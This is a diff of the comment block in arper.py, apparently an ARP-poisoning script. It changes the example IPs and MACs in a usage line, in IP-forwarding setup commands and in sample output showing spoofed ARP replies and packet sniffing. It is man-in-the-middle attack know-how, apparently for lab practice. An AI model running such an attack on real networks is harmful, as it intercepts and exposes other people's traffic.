@@ -130,29 +130,29 @@ if __name__ == '__main__':
 # Attacker OS: Kali Linux
 #
 #                      victim    gateway  interface
-# sudo python arper.py 10.0.2.15 10.0.2.1 eth0
+# sudo python arper.py 10.0.0.15 10.0.0.1 eth0
 #
 # ----------------------- Optional if comuncation not happening --------------------------
 # 𝘦𝘤𝘩𝘰 1 > /𝘱𝘳𝘰𝘤/𝘴𝘺𝘴/𝘯𝘦𝘵/𝘪𝘱𝘷4/𝘪𝘱_𝘧𝘰𝘳𝘸𝘢𝘳𝘥 <run before arper.py>
 # 𝘴𝘶𝘥𝘰 𝘴𝘺𝘴 -𝘸 𝘯𝘦𝘵.𝘪𝘯𝘦𝘵.𝘪𝘱.𝘧𝘰𝘳𝘸𝘢𝘳𝘥𝘪𝘯𝘨=1 <lets the host know that we can forward packages>
 
 # 𝗢𝘂𝘁𝗽𝘂𝘁:
-# sudo python arper.py 10.0.2.15 10.0.2.1 eth0
+# sudo python arper.py 10.0.0.15 10.0.0.1 eth0
 # Initialized eth0:
-# Gateway (10.0.2.1) is at 52:54:00:12:35:00
-# Victim (10.0.2.15) is at 08:00:27:6e:ad:bb
+# Gateway (10.0.0.1) is at 50:54:00:10:35:00
+# Victim (10.0.0.15) is at 08:00:67:6e:ad:bb
 # ------------------------------
-# ip src: 10.0.2.1
-# ip dst: 10.0.2.15
-# mac src: 08:00:27:87:ae:89
-# mac dst: 08:00:27:6e:ad:bb
-# ARP is at 08:00:27:87:ae:89 says 10.0.2.1
+# ip src: 10.0.0.1
+# ip dst: 10.0.0.15
+# mac src: 08:00:67:87:ae:89
+# mac dst: 08:00:67:6e:ad:bb
+# ARP is at 08:00:67:87:ae:89 says 10.0.0.1
 # ------------------------------
-# ip src: 10.0.2.15
-# ip dst: 10.0.2.1
-# mac src: 08:00:27:87:ae:89
-# mac dst: 52:54:00:12:35:00
-# ARP is at 08:00:27:87:ae:89 says 10.0.2.15
+# ip src: 10.0.0.15
+# ip dst: 10.0.0.1
+# mac src: 08:00:67:87:ae:89
+# mac dst: 50:54:00:10:35:00
+# ARP is at 08:00:67:87:ae:89 says 10.0.0.15
 # ------------------------------
 # Beginning the ARP poison. [CTRL-C to stop]
 # ...Sniffing 100 packets
